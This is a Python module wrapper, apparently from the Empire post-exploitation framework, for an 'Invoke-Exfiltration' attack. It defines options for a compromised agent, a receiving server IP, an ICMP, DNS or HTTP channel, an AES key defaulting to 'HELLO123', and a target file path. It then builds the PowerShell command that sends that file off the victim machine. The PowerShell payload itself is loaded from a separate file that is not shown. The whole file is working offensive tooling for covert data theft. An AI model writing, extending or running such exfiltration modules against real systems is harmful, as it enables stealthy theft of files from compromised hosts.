from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Invoke-Exfiltration',

            # list of one or more authors for the module
            'Author': ['Nick Britton <nerbies@gmail.com>'],

            # more verbose multi-line description of the module
            'Description': ('This module will exfiltration data over a range of protocols'),

            # True if the module needs to run in the background
            'Background' : True,

            # File extension to save the file as
            'OutputExtension' : None,

            # True if the module needs admin rights to run
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            # Disabled - this can be a relatively noisy module but sometimes useful
            'OpsecSafe' : False,

            # The minimum PowerShell version needed for the module to run
            'MinPSVersion' : '2',

            # list of any references/other comments
            'Comments': [
                'Based heavily on the great work done by Sensepost here: http://github.com/sensepost/det'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
             # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to generate the source traffic on',
                'Required'      :   True,
                'Value'         :   ''
            },
            'server' : {
                'Description'   :   'Receiving Server IP',
                'Required'      :   True,
                'Value'         :   ''
            },
            'type' : {
                'Description'   :   'The protocol to use (ICMP, DNS, HTTP)',
                'Required'      :   True,
                'Value'         :   'ICMP'
            },
            'key' : {
                'Description'   :   'AES encryption key to use',
                'Required'      :   True,
                'Value'         :   'HELLO123'
            },
            'file' : {
                'Description'   :   'Full path of file to exfiltrate',
                'Required'      :   True,
                'Value'         :   ''
            },
            'port' : {
                'Description'   :   'Port (for HTTP exfiltration only).',
                'Required'      :   False,
                'Value'         :   '8080'
            },
            'dns' : {
                'Description'   :   'DNS Server to you (for DNS exfiltration only).',
                'Required'      :   False,
                'Value'         :   'google.com'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self):
        # if you're reading in a large, external script that might be updates,
        #   use the pattern below
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/exfil/Invoke-Exfiltration.ps1"
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # Need to actually run the module that has been loaded
        script += 'Invoke-Exfiltration'

        # add any arguments to the end execution of the script
        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " \"" + str(values['Value']) + "\""

        return script


